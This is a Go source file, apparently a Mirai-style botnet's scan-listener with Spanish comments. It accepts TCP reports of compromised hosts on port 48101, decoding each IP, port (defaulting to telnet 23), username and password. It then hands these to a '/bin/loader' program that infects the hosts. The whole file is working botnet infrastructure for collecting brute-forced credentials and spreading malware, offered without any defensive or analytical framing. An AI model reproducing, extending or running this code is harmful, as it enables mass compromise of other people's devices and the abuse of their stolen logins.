package main

import (
    "fmt"
    "net"
    "encoding/binary"
    "errors"
    "time"
    "os"
    "os/exec"
    "io"
    "io/ioutil"
)

func main() {
    l, err := net.Listen("tcp", "0.0.0.0:48101")
    if err != nil {
        fmt.Println(err)
        return
    }

    for {
        conn, err := l.Accept()
        if err != nil {
            break
        }
        go handleConnection(conn)
    }
}

func SaveStringToTempFile(str string) (string, error) {
	// Crea un archivo temporal
	file, err := ioutil.TempFile("", "tempfile")
	if err != nil {
		return "", err
	}
	defer file.Close()

	// Escribe el contenido del string en el archivo
	_, err = file.WriteString(str)
	if err != nil {
		return "", err
	}

	// Guarda la ruta del archivo temporal
	return file.Name(), nil
}

func ExecuteScript(scriptPath string, params ...string) (int, string, error) {
	cmd := exec.Command(scriptPath, params...)

	output, err := cmd.CombinedOutput()
	if err != nil {
		return cmd.ProcessState.ExitCode(), string(output), err
	}

	return cmd.ProcessState.ExitCode(), string(output), nil
}

func runLoader(ip, port, user, pass string) {
    fmt.Printf("[SCANLISTEN] [%s] Running loader...\n", ip)
    _, _, err := ExecuteScript("/bin/loader", fmt.Sprintf("%s:%s", ip, port), fmt.Sprintf("%s:%s", user, pass))
	if err != nil {
        fmt.Printf("[SCANLISTEN] [%s] Error running loader command: %v\n", ip, err)
        return
	}
    //fmt.Printf("[SCANLISTEN] [%s] Code: %v\n", ip, code)
    //fmt.Printf("[SCANLISTEN] [%s] Error: %v\n", ip, err)
    //fmt.Printf("[SCANLISTEN] [%s] Out: %v\n", ip, out)
    fmt.Printf("[SCANLISTEN] [%s] Error running loader command: %v\n", ip, err)
    return

    line := fmt.Sprintf("%s:%s %s:%s\n", ip, port, user, pass)

    /*
    tempFilePath, err := SaveStringToTempFile(line)
    if err != nil {
        fmt.Printf("[SCANLISTEN] Error creating temp file: %v\n", err)
        return
    }

    _, _, err = ExecuteScript("/root/load_hosts.sh", tempFilePath)
    if err != nil {
        fmt.Printf("[SCANLISTEN] Error running script: %v\n", err)
        return
    }

    return
    */

    // Command 1: echo
    echoCmd := exec.Command("echo", line)

    // Create a pipe for ls command
    echoPipeReader, echoPipeWriter := io.Pipe()
    defer echoPipeReader.Close()
    defer echoPipeWriter.Close()

    // Set the stdout for ls command to the writer end of the pipe
    echoCmd.Stdout = echoPipeWriter

    // Command 2: loader
    loaderCmd := exec.Command("loader")

    // Set the stdin and stdout for loader command
    loaderCmd.Stdin = echoPipeReader
    loaderCmd.Stdout = os.Stdout

    // Start the loader command
    if err := loaderCmd.Start(); err != nil {
        fmt.Printf("[SCANLISTEN] Error starting loader command: %v\n", err)
        return
    }

    // Start the echo command
    if err := echoCmd.Start(); err != nil {
        fmt.Printf("[SCANLISTEN] Error starting echo command: %v\n", err)
        return
    }

    // Wait for the echo command to finish
    if err := echoCmd.Wait(); err != nil {
        fmt.Printf("[SCANLISTEN] Error waiting for echo command: %v\n", err)
        return
    }

    // Close the writer end of the pipe
    echoPipeWriter.Close()

    // Wait for the loader command to finish
    if err := loaderCmd.Wait(); err != nil {
        fmt.Printf("[SCANLISTEN] Error waiting for loader command: %v\n", err)
        return
    }

    fmt.Printf("[SCANLISTEN] Host %s:%s (%s:%s) enviado al loader.\n", ip, port, user, pass)
}

func handleConnection(conn net.Conn) {
    defer conn.Close()
    conn.SetDeadline(time.Now().Add(10 * time.Second))

    fmt.Printf("[SCANLISTEN] ¡Conexión entrante!\n")

    bufChk, err := readXBytes(conn, 1)
    if err != nil {
        return
    }

    var ipInt uint32
    var portInt uint16

    if bufChk[0] == 0 {
        ipBuf, err := readXBytes(conn, 4)
        if err != nil {
            return
        }
        ipInt = binary.BigEndian.Uint32(ipBuf)

        portBuf, err := readXBytes(conn, 2)
        if err != nil {
            return;
        }

        portInt = binary.BigEndian.Uint16(portBuf)
    } else {
        ipBuf, err := readXBytes(conn, 3)
        if err != nil {
            return;
        }
        ipBuf = append(bufChk, ipBuf...)

        ipInt = binary.BigEndian.Uint32(ipBuf)

        portInt = 23
    }

    uLenBuf, err := readXBytes(conn, 1)
    if err != nil {
        return
    }
    usernameBuf, err := readXBytes(conn, int(byte(uLenBuf[0])))

    pLenBuf, err := readXBytes(conn, 1)
    if err != nil {
        return
    }
    passwordBuf, err := readXBytes(conn, int(byte(pLenBuf[0])))
    if err != nil {
        return
    }

    fmt.Printf("[SCANLISTEN] Input: %d.%d.%d.%d:%d %s:%s\n", (ipInt >> 24) & 0xff, (ipInt >> 16) & 0xff, (ipInt >> 8) & 0xff, ipInt & 0xff, portInt, string(usernameBuf), string(passwordBuf))
    
    runLoader(
        fmt.Sprintf("%d.%d.%d.%d", (ipInt >> 24) & 0xff, (ipInt >> 16) & 0xff, (ipInt >> 8) & 0xff, ipInt & 0xff),
        fmt.Sprintf("%d", portInt),
        string(usernameBuf),
        string(passwordBuf))
}

func readXBytes(conn net.Conn, amount int) ([]byte, error) {
    buf := make([]byte, amount)
    tl := 0

    for tl < amount {
        rd, err := conn.Read(buf[tl:])
        if err != nil || rd <= 0 {
            return nil, errors.New("Failed to read")
        }
        tl += rd
    }

    return buf, nil
}
